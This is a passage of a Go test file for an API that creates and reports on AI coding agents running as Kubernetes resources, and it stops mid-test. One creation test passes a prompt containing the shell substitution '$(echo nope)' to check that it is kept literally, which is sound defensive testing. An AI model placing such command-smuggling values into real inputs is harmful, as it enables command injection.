package api_test

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"reflect"
	"strconv"
	"strings"
	"testing"
	"time"

	corev1 "k8s.io/api/core/v1"
	k8serrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	"github.com/matty-v/kyber/pkg/api"
	kyberv1 "github.com/matty-v/kyber/pkg/api/v1"
	"github.com/matty-v/kyber/pkg/oauth/mockserver"
	"github.com/matty-v/kyber/pkg/runtimedetect"
	"github.com/matty-v/kyber/pkg/tokenreport"
	"github.com/matty-v/kyber/pkg/tokenstore"
)

// defaultMachine returns a Machine CRD named "worker-1" that agent-creation
// tests can reference in their "machine" field. Without this, the API now
// rejects the agent with 400 ("machine 'worker-1' does not exist").
// Capacity is set generously so the capacity check doesn't block normal tests.
func defaultMachine() *kyberv1.Machine {
	return &kyberv1.Machine{
		ObjectMeta: metav1.ObjectMeta{Name: "worker-1", Namespace: "kyber-system"},
		Spec: kyberv1.MachineSpec{
			Provider:    "gce",
			MachineType: "e2-standard-2",
			Zone:        "us-central1-a",
			Capacity: kyberv1.MachineCapacity{
				CPU:    resource.MustParse("64"),
				Memory: resource.MustParse("256Gi"),
			},
		},
	}
}

func TestGetAgentModelsReturnsOnlyAuthenticatedAgentCatalog(t *testing.T) {
	s := newTestPublicServer(t, testAPIKey)
	agent := sampleAgentCRD("alice")
	if err := s.K8sClient.Create(context.Background(), agent); err != nil {
		t.Fatalf("creating agent: %v", err)
	}
	cache := runtimedetect.NewMemoryCache()
	if err := cache.PutAgentModels(context.Background(), "alice", []runtimedetect.Model{{ID: "claude-opus-4-1", DisplayName: "Claude Opus 4.1", ContextWindow: 200_000, ContextWindowKnown: true}}); err != nil {
		t.Fatalf("seeding catalog: %v", err)
	}
	if err := cache.PutAgentModels(context.Background(), "bob", []runtimedetect.Model{{ID: "claude-sonnet-4-5", DisplayName: "Claude Sonnet 4.5"}}); err != nil {
		t.Fatalf("seeding other catalog: %v", err)
	}
	s.RuntimeDetectCache = cache
	req := scopedRequest(http.MethodGet, "/api/v1/agents/alice/models", testAPIKey)
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "claude-opus-4-1") || strings.Contains(rr.Body.String(), "claude-sonnet-4-5") {
		t.Fatalf("unexpected response: %s", rr.Body.String())
	}
}

func TestGetAgentModelsRequiresAuthenticatedCatalog(t *testing.T) {
	s := newTestPublicServer(t, testAPIKey)
	if err := s.K8sClient.Create(context.Background(), sampleAgentCRD("alice")); err != nil {
		t.Fatalf("creating agent: %v", err)
	}
	s.RuntimeDetectCache = runtimedetect.NewMemoryCache()
	req := scopedRequest(http.MethodGet, "/api/v1/agents/alice/models", testAPIKey)
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)
	if rr.Code != http.StatusConflict || !strings.Contains(rr.Body.String(), "authentication_required") {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
}

// buildAgentHandler creates a test HTTP handler backed by a fake client.
// It always pre-seeds "worker-1" Machine so agent creation passes the
// machine-existence check. Extra objects can be passed via objs.
func buildAgentHandler(t *testing.T, objs ...runtime.Object) (http.Handler, client.Client) {
	t.Helper()
	scheme := mustNewScheme(t)
	all := append([]runtime.Object{defaultMachine()}, objs...)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).WithRuntimeObjects(all...).Build()
	s := &api.Server{
		K8sClient:     fakeClient,
		APIKey:        testAPIKey,
		Namespace:     "kyber-system",
		ValidRuntimes: map[string]bool{"claude-code": true},
	}
	return s.BuildHandler(), fakeClient
}

// Scoped API keys for the kyber#565 DELETE-authz tests: a write-only caller
// (under-scoped for the lifecycle:admin DELETE) and an admin caller.
const (
	writeScopedKey = "write-key-565"
	adminScopedKey = "admin-key-565"
)

// buildScopedAgentHandler builds a handler with enforcement ON and two scoped
// callers (write-only + admin), so the DELETE-authz gate (kyber#565) can be
// exercised end-to-end through the auth middleware.
func buildScopedAgentHandler(t *testing.T, objs ...runtime.Object) (http.Handler, client.Client) {
	t.Helper()
	scheme := mustNewScheme(t)
	all := append([]runtime.Object{defaultMachine()}, objs...)
	fakeClient := fake.NewClientBuilder().WithScheme(scheme).WithRuntimeObjects(all...).Build()
	s := &api.Server{
		K8sClient:    fakeClient,
		APIKey:       testAPIKey,
		AuthzEnforce: true,
		Callers: []api.ScopedCaller{
			{Name: "write-caller", Key: writeScopedKey, Scopes: []string{"lifecycle:write"}},
			{Name: "admin-caller", Key: adminScopedKey, Scopes: []string{"lifecycle:admin"}},
		},
		Namespace:     "kyber-system",
		ValidRuntimes: map[string]bool{"claude-code": true},
	}
	return s.BuildHandler(), fakeClient
}

// scopedRequest builds a request authenticated with a specific scoped key.
func scopedRequest(method, target, key string) *http.Request {
	req := httptest.NewRequest(method, target, nil)
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("Content-Type", "application/json")
	return req
}

// sampleAgentCRD returns a pre-built Agent CRD for tests.
func sampleAgentCRD(name string) *kyberv1.Agent {
	return &kyberv1.Agent{
		ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "kyber-system"},
		Spec: kyberv1.AgentSpec{
			Machine: "worker-1",
			Runtime: "claude-code",
			Model:   "claude-sonnet-4",
			Resources: kyberv1.AgentResources{
				CPU:    resource.MustParse("1"),
				Memory: resource.MustParse("2Gi"),
				Disk:   resource.MustParse("50Gi"),
			},
			Secrets: kyberv1.AgentSecrets{AuthType: kyberv1.AgentAuthTypeOAuth},
		},
	}
}

// TestAgents_Create_HappyPath verifies POST /api/v1/agents creates the agent.
func TestAgents_Create_HappyPath(t *testing.T) {
	h, _ := buildAgentHandler(t)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents", map[string]interface{}{
		"name":          "dave",
		"machine":       "worker-1",
		"runtime":       "claude-code",
		"startupPrompt": "Continue the work.\nTreat $(echo nope) literally.",
		"resources": map[string]interface{}{
			"cpu":    "1",
			"memory": "2Gi",
			"disk":   "50Gi",
		},
		"secrets": map[string]interface{}{
			"authType": "oauth",
		},
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusCreated {
		t.Errorf("want 201, got %d: %s", rr.Code, rr.Body.String())
	}
	var resp api.AgentResponse
	if err := json.NewDecoder(rr.Body).Decode(&resp); err != nil {
		t.Fatalf("decoding: %v", err)
	}
	if resp.ID != "dave" {
		t.Errorf("ID: got %q, want %q", resp.ID, "dave")
	}
	if resp.Model != "" {
		t.Errorf("Model: got %q, want empty fleet-default override", resp.Model)
	}
	if resp.StartupPrompt != "Continue the work.\nTreat $(echo nope) literally." {
		t.Errorf("StartupPrompt: got %q", resp.StartupPrompt)
	}
}

// TestAgents_Get_ExposesIdentityRepoStatus verifies that GET /api/v1/agents/{name}
// surfaces spec.identityRepo + status.identityRepo in the response. This is the
// kubectl-free diagnostic path for verifying the controller's token minter
// state from outside the cluster.
func TestAgents_Get_ExposesIdentityRepoStatus(t *testing.T) {
	expires := metav1.NewTime(time.Date(2026, 1, 2, 3, 4, 5, 0, time.UTC))
	minted := metav1.NewTime(time.Date(2026, 1, 2, 2, 54, 5, 0, time.UTC))
	agent := sampleAgentCRD("dave")
	agent.Spec.IdentityRepo = kyberv1.AgentIdentityRepo{Repo: "matty-v/chewie-agent"}
	agent.Status.IdentityRepo = kyberv1.AgentIdentityRepoStatus{
		Phase:          kyberv1.AgentIdentityRepoPhaseReady,
		Repo:           "matty-v/chewie-agent",
		TokenExpiresAt: &expires,
		LastMinted:     &minted,
	}

	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}

	// Decode as a generic map so the test asserts on the wire-level JSON shape
	// rather than the Go-side struct (which the frontend doesn't see).
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	irRaw, ok := wire["identityRepo"]
	if !ok {
		t.Fatalf("response missing identityRepo: %v", wire)
	}
	ir, ok := irRaw.(map[string]interface{})
	if !ok {
		t.Fatalf("identityRepo wrong type: %T", irRaw)
	}
	if got := ir["repo"]; got != "matty-v/chewie-agent" {
		t.Errorf("identityRepo.repo: got %v, want matty-v/chewie-agent", got)
	}
	if got := ir["phase"]; got != "Ready" {
		t.Errorf("identityRepo.phase: got %v, want Ready", got)
	}
	if got := ir["tokenExpiresAt"]; got != "2026-01-02T03:04:05Z" {
		t.Errorf("identityRepo.tokenExpiresAt: got %v", got)
	}
	if got := ir["lastMinted"]; got != "2026-01-02T02:54:05Z" {
		t.Errorf("identityRepo.lastMinted: got %v", got)
	}
}

func TestAgents_Get_ExposesResourceUsage(t *testing.T) {
	sampled := metav1.NewTime(time.Date(2026, 8, 27, 12, 0, 0, 0, time.UTC))
	diskSampled := metav1.NewTime(time.Date(2026, 8, 27, 11, 58, 0, 0, time.UTC))
	cpuLimit := int64(2000)
	memoryLimit := int64(2 * 1024 * 1024 * 1024)
	agent := sampleAgentCRD("dave")
	agent.Status.Activity = &kyberv1.ActivityStatus{Resources: &kyberv1.AgentResourceUsage{
		SampledAt: sampled, CPUUsageMillicores: 750, CPULimitMillicores: &cpuLimit,
		MemoryUsedBytes: 1024 * 1024 * 1024, MemoryLimitBytes: &memoryLimit,
		DiskUsedBytes: 18 * 1024 * 1024 * 1024, DiskTotalBytes: 20 * 1024 * 1024 * 1024,
		DiskLimitEnforced: false, DiskBackingTotalBytes: 100 * 1024 * 1024 * 1024, DiskBackingAvailableBytes: 60 * 1024 * 1024 * 1024,
		DiskReserveReached: true,
		DiskUsageMethod:    "directory", DiskUsageState: "ready", DiskUsedSampledAt: &diskSampled,
	}}

	h, _ := buildAgentHandler(t, agent)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]any
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatal(err)
	}
	activity := wire["activity"].(map[string]any)
	usage := activity["resources"].(map[string]any)
	if usage["cpuUsageCores"] != 0.75 || usage["cpuLimitCores"] != 2.0 || usage["diskReserveReached"] != true {
		t.Errorf("unexpected resource usage wire shape: %v", usage)
	}
	if usage["sampledAt"] != "2026-08-27T12:00:00Z" {
		t.Errorf("sampledAt = %v", usage["sampledAt"])
	}
	if usage["diskUsageMethod"] != "directory" || usage["diskUsageState"] != "ready" || usage["diskUsedSampledAt"] != "2026-08-27T11:58:00Z" {
		t.Errorf("disk accounting metadata = %v", usage)
	}
	if usage["diskLimitEnforced"] != false || usage["diskBackingTotalBytes"] != float64(100*1024*1024*1024) || usage["diskBackingAvailableBytes"] != float64(60*1024*1024*1024) {
		t.Errorf("disk enforcement metadata = %v", usage)
	}
}

// TestAgents_Get_ExposesRuntimeVersion verifies the response surfaces
// status.runtime.installedVersion when populated by the in-pod reporter.
// The PWA reads this to show what Claude Code version each agent is running.
func TestAgents_Get_ExposesRuntimeVersion(t *testing.T) {
	installed := metav1.NewTime(time.Date(2026, 4, 24, 2, 15, 0, 0, time.UTC))
	usable := false
	agent := sampleAgentCRD("dave")
	agent.Status.Runtime = kyberv1.AgentRuntimeStatus{
		Runtime:          "claude-code",
		Usable:           &usable,
		ProbeMessage:     "claude: text file busy",
		InstalledVersion: "2.1.119",
		InstalledAt:      &installed,
	}

	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}

	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	rvRaw, ok := wire["runtimeVersion"]
	if !ok {
		t.Fatalf("response missing runtimeVersion: %v", wire)
	}
	rv, ok := rvRaw.(map[string]interface{})
	if !ok {
		t.Fatalf("runtimeVersion wrong type: %T", rvRaw)
	}
	if got := rv["installedVersion"]; got != "2.1.119" {
		t.Errorf("runtimeVersion.installedVersion: got %v, want 2.1.119", got)
	}
	if got := rv["installedAt"]; got != "2026-04-24T02:15:00Z" {
		t.Errorf("runtimeVersion.installedAt: got %v", got)
	}
	if got := rv["runtime"]; got != "claude-code" {
		t.Errorf("runtimeVersion.runtime: got %v", got)
	}
	if got := rv["usable"]; got != false {
		t.Errorf("runtimeVersion.usable: got %v", got)
	}
	if got := rv["probeMessage"]; got != "claude: text file busy" {
		t.Errorf("runtimeVersion.probeMessage: got %v", got)
	}
}

// TestAgents_Get_OmitsRuntimeVersionWhenUnset verifies the field is absent
// for agents whose pod hasn't yet reported (e.g. freshly-created or an
// upgrade lagging behind). Clients must tolerate the optional shape.
func TestAgents_Get_OmitsRuntimeVersionWhenUnset(t *testing.T) {
	agent := sampleAgentCRD("zed")
	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/zed", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if _, ok := wire["runtimeVersion"]; ok {
		t.Errorf("runtimeVersion should be omitted until a report lands; got %v", wire["runtimeVersion"])
	}
}

// TestAgents_Get_ExposesScheduling verifies kyber#210 PR-A: a stuck-Pending
// agent surfaces the scheduling-failure status (category + verbatim message
// + first-observed timestamp) so the PWA banner has something to render.
func TestAgents_Get_ExposesScheduling(t *testing.T) {
	observed := metav1.NewTime(time.Date(2026, 5, 2, 21, 30, 0, 0, time.UTC))
	agent := sampleAgentCRD("dave")
	agent.Status.Scheduling = &kyberv1.AgentSchedulingStatus{
		Category:        "Capacity",
		LastError:       "0/1 nodes are available: 1 Insufficient memory.",
		FirstObservedAt: &observed,
	}

	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	schRaw, ok := wire["scheduling"]
	if !ok {
		t.Fatalf("response missing scheduling: %v", wire)
	}
	sch, ok := schRaw.(map[string]interface{})
	if !ok {
		t.Fatalf("scheduling wrong type: %T", schRaw)
	}
	if got := sch["category"]; got != "Capacity" {
		t.Errorf("scheduling.category: got %v, want Capacity", got)
	}
	if got := sch["lastError"]; got != "0/1 nodes are available: 1 Insufficient memory." {
		t.Errorf("scheduling.lastError: got %v", got)
	}
	if got := sch["firstObservedAt"]; got != "2026-05-02T21:30:00Z" {
		t.Errorf("scheduling.firstObservedAt: got %v, want 2026-05-02T21:30:00Z", got)
	}
}

// TestAgents_Get_ExposesDirtyWhenSpecAhead verifies kyber#157 PR-A:
// the response surfaces dirty=true when the running pod's stamped
// generation is older than the live spec's generation.
func TestAgents_Get_ExposesDirtyWhenSpecAhead(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Generation = 5                // operator made some edits
	agent.Status.ObservedGeneration = 3 // pod was rolled at gen 3, hasn't been re-rolled since

	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	dirty, ok := wire["dirty"].(bool)
	if !ok {
		t.Fatalf("response missing dirty boolean: %+v", wire)
	}
	if !dirty {
		t.Error("dirty: got false, want true (generation 5 > observedGeneration 3)")
	}
}

// TestAgents_Get_OmitsDirtyWhenAtRest verifies the dirty flag is omitted
// (or false) when the pod is on the latest generation. The wire shape
// uses omitempty so the JSON key may be absent — both shapes are valid.
func TestAgents_Get_OmitsDirtyWhenAtRest(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Generation = 4
	agent.Status.ObservedGeneration = 4

	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if v, present := wire["dirty"]; present {
		if dirty, _ := v.(bool); dirty {
			t.Errorf("dirty: got true, want false (generation == observedGeneration)")
		}
	}
}

// TestAgents_Get_ExposesDirtyWhenSidecarOutOfDate pins kyber#299:
// when the controller has set Status.Conditions[SidecarOutOfDate] to
// True (running pod's status-sidecar digest != controller's current
// StatusSidecarImage), AgentResponse.dirty is true even when the spec
// generation is at-rest. Operator action surfaces the same badge as
// spec-drift.
func TestAgents_Get_ExposesDirtyWhenSidecarOutOfDate(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Generation = 4
	agent.Status.ObservedGeneration = 4 // spec at rest
	agent.Status.Conditions = []metav1.Condition{
		{
			Type:    kyberv1.AgentConditionSidecarOutOfDate,
			Status:  metav1.ConditionTrue,
			Reason:  "PodPredatesSidecarUpdate",
			Message: "Pod's status-sidecar (sha256:old) does not match controller's current sidecar image (sha256:new); restart the pod to apply.",
			// metav1.Condition requires LastTransitionTime to be non-zero
			// for the API server to accept the patch in production; for
			// the wire-shape test we use a synthetic time.
			LastTransitionTime: metav1.Now(),
		},
	}

	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	dirty, ok := wire["dirty"].(bool)
	if !ok || !dirty {
		t.Errorf("dirty: got %v (ok=%v), want true (SidecarOutOfDate condition is True)", wire["dirty"], ok)
	}
}

// TestAgents_Get_OmitsDirtyWhenSidecarConditionFalse pins the inverse:
// the SidecarOutOfDate condition set to False does NOT contribute to
// dirty (only the True branch flags). Otherwise every reconciled agent
// would be eternally dirty after the first reconcile sets the False
// state.
func TestAgents_Get_OmitsDirtyWhenSidecarConditionFalse(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Generation = 4
	agent.Status.ObservedGeneration = 4
	agent.Status.Conditions = []metav1.Condition{
		{
			Type:               kyberv1.AgentConditionSidecarOutOfDate,
			Status:             metav1.ConditionFalse,
			Reason:             "Current",
			Message:            "Pod's status-sidecar matches the controller's current sidecar image.",
			LastTransitionTime: metav1.Now(),
		},
	}

	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/dave", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	var wire map[string]interface{}
	_ = json.NewDecoder(rr.Body).Decode(&wire)
	if v, present := wire["dirty"]; present {
		if dirty, _ := v.(bool); dirty {
			t.Errorf("dirty: got true on Sidecar=Current agent, want false")
		}
	}
}

// TestAgents_Get_OmitsDirtyBeforeFirstReconcile verifies that a freshly-
// created agent whose pod hasn't been built yet (Generation > 0,
// ObservedGeneration == 0) is NOT flagged dirty. The PWA badge would
// otherwise light up on every new agent which is operator-noisy and
// semantically wrong — the agent isn't pending a restart, it's pending
// initial creation.
func TestAgents_Get_OmitsDirtyBeforeFirstReconcile(t *testing.T) {
	agent := sampleAgentCRD("rookie")
	agent.Generation = 1                // controller-runtime stamps Generation=1 on Create
	agent.Status.ObservedGeneration = 0 // reconciler hasn't run yet

	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/rookie", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if v, present := wire["dirty"]; present {
		if dirty, _ := v.(bool); dirty {
			t.Errorf("dirty: got true on never-reconciled agent, want false")
		}
	}
}

// TestAgents_Get_OmitsSchedulingWhenUnset verifies the field is absent for
// healthy / not-yet-stuck agents so existing clients don't see a noisy
// null-or-empty object on every GET.
func TestAgents_Get_OmitsSchedulingWhenUnset(t *testing.T) {
	agent := sampleAgentCRD("zed")
	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/zed", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if _, ok := wire["scheduling"]; ok {
		t.Errorf("scheduling should be omitted when unset; got %v", wire["scheduling"])
	}
}

// TestAgents_Get_OmitsIdentityRepoWhenUnset verifies the identityRepo field is
// omitted from the response when the agent doesn't have one configured — so
// existing agent responses stay byte-compatible for clients that haven't
// updated their parsing.
func TestAgents_Get_OmitsIdentityRepoWhenUnset(t *testing.T) {
	agent := sampleAgentCRD("eve")
	h, _ := buildAgentHandler(t, agent)
	req := authedRequest(t, http.MethodGet, "/api/v1/agents/eve", nil)
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	var wire map[string]interface{}
	if err := json.NewDecoder(rr.Body).Decode(&wire); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if _, ok := wire["identityRepo"]; ok {
		t.Errorf("identityRepo should be omitted when spec.identityRepo.repo is empty; got %v", wire["identityRepo"])
	}
}

// TestAgents_Create_IdentityRepoPassthrough verifies that identityRepo.repo on
// the request body lands on the Agent CRD's spec.identityRepo.repo. The rest
// of the identity-repo flow (token minting, Secret write) is exercised by the
// controller tests; here we only need to confirm the API plumbing.
func TestAgents_Create_IdentityRepoPassthrough(t *testing.T) {
	scheme := mustNewScheme(t)
	fakeClient := fake.NewClientBuilder().
		WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).
		Build()
	s := &api.Server{
		K8sClient:     fakeClient,
		APIKey:        testAPIKey,
		Namespace:     "kyber-system",
		ValidRuntimes: map[string]bool{"claude-code": true},
	}
	h := s.BuildHandler()

	req := authedRequest(t, http.MethodPost, "/api/v1/agents", map[string]interface{}{
		"name":    "dave",
		"machine": "worker-1",
		"runtime": "claude-code",
		"model":   "claude-sonnet-4",
		"resources": map[string]interface{}{
			"cpu":    "1",
			"memory": "2Gi",
			"disk":   "50Gi",
		},
		"identityRepo": map[string]interface{}{
			"repo": "matty-v/chewie-agent",
		},
		"secrets": map[string]interface{}{
			"authType": "oauth",
		},
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusCreated {
		t.Fatalf("want 201, got %d: %s", rr.Code, rr.Body.String())
	}

	got := &kyberv1.Agent{}
	if err := fakeClient.Get(context.Background(),
		types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("fetching created agent: %v", err)
	}
	if got.Spec.IdentityRepo.Repo != "matty-v/chewie-agent" {
		t.Errorf("spec.identityRepo.repo: got %q, want %q",
			got.Spec.IdentityRepo.Repo, "matty-v/chewie-agent")
	}
}

// TestAgents_Create_IdentityRepoOmittedDefaultsEmpty verifies that omitting
// identityRepo leaves spec.identityRepo.repo empty — i.e. existing agents
// created without the field keep working.
func TestAgents_Create_IdentityRepoOmittedDefaultsEmpty(t *testing.T) {
	scheme := mustNewScheme(t)
	fakeClient := fake.NewClientBuilder().
		WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).
		Build()
	s := &api.Server{
		K8sClient:     fakeClient,
		APIKey:        testAPIKey,
		Namespace:     "kyber-system",
		ValidRuntimes: map[string]bool{"claude-code": true},
	}
	h := s.BuildHandler()

	req := authedRequest(t, http.MethodPost, "/api/v1/agents", map[string]interface{}{
		"name":    "eve",
		"machine": "worker-1",
		"runtime": "claude-code",
		"model":   "claude-sonnet-4",
		"resources": map[string]interface{}{
			"cpu":    "1",
			"memory": "2Gi",
			"disk":   "50Gi",
		},
		"secrets": map[string]interface{}{
			"authType": "oauth",
		},
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusCreated {
		t.Fatalf("want 201, got %d: %s", rr.Code, rr.Body.String())
	}

	got := &kyberv1.Agent{}
	if err := fakeClient.Get(context.Background(),
		types.NamespacedName{Name: "eve", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("fetching created agent: %v", err)
	}
	if got.Spec.IdentityRepo.Repo != "" {
		t.Errorf("spec.identityRepo.repo: got %q, want empty", got.Spec.IdentityRepo.Repo)
	}
}

// TestAgents_Create_ValidationErrors verifies 400 for missing/invalid fields.
func TestAgents_Create_ValidationErrors(t *testing.T) {
	h, _ := buildAgentHandler(t)

	cases := []struct {
		name string
		body map[string]interface{}
	}{
		{"missing name", map[string]interface{}{"machine": "w1", "runtime": "claude-code", "model": "claude-sonnet-4"}},
		{"invalid name", map[string]interface{}{"name": "UPPER", "machine": "w1", "runtime": "claude-code", "model": "m"}},
		{"missing machine", map[string]interface{}{"name": "dave", "runtime": "claude-code", "model": "m"}},
		{"missing runtime", map[string]interface{}{"name": "dave", "machine": "w1", "model": "m"}},
		{"invalid cpu", map[string]interface{}{"name": "dave", "machine": "w1", "runtime": "r", "model": "m", "resources": map[string]interface{}{"cpu": "notavalue"}}},
		{"telegram with api-key", map[string]interface{}{"name": "dave", "machine": "w1", "runtime": "claude-code", "model": "m", "secrets": map[string]interface{}{"authType": "api-key", "telegramEnabled": true, "anthropicApiKey": "sk-ant-test"}}},
		{"telegram without allowlist", map[string]interface{}{"name": "dave", "machine": "w1", "runtime": "claude-code", "model": "m", "secrets": map[string]interface{}{"authType": "oauth", "telegramEnabled": true}}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := authedRequest(t, http.MethodPost, "/api/v1/agents", tc.body)
			rr := httptest.NewRecorder()
			h.ServeHTTP(rr, req)
			if rr.Code != http.StatusBadRequest {
				t.Errorf("want 400, got %d: %s", rr.Code, rr.Body.String())
			}
		})
	}
}

// TestAgents_Create_Conflict verifies 409 when agent already exists.
func TestAgents_Create_Conflict(t *testing.T) {
	existing := sampleAgentCRD("dave")
	h, _ := buildAgentHandler(t, existing)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents", map[string]interface{}{
		"name": "dave", "machine": "worker-1", "runtime": "claude-code", "model": "m",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusConflict {
		t.Errorf("want 409, got %d: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_Create_OrphanedSecret_DoesNotSilentlyOverwrite verifies that when
// a Secret matching the new agent's naming scheme already exists (e.g. from a
// previous partially-failed create), the handler rejects with 409 instead of
// silently replacing the stored token. See issue #61.
func TestAgents_Create_OrphanedSecret_DoesNotSilentlyOverwrite(t *testing.T) {
	orphan := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "dave-telegram",
			Namespace: "kyber-system",
			Labels:    map[string]string{"kyber.io/agent": "dave"},
		},
		StringData: map[string]string{"token": "ORIGINAL-TOKEN"},
	}
	h, k := buildAgentHandler(t, orphan)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents", map[string]interface{}{
		"name":    "dave",
		"machine": "worker-1",
		"runtime": "claude-code",
		"model":   "claude-sonnet-4",
		"resources": map[string]interface{}{
			"cpu": "1", "memory": "2Gi", "disk": "50Gi",
		},
		"secrets": map[string]interface{}{
			"authType":               "oauth",
			"telegramEnabled":        true,
			"telegramBotToken":       "SHOULD-NOT-OVERWRITE",
			"telegramAllowedUserIds": []string{"1000000001"},
		},
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusConflict {
		t.Fatalf("want 409 (orphan secret blocks create), got %d: %s", rr.Code, rr.Body.String())
	}

	// Existing secret value must be unchanged — no silent overwrite.
	got := &corev1.Secret{}
	if err := k.Get(context.Background(), types.NamespacedName{Name: "dave-telegram", Namespace: "kyber-system"}, got); err != nil {
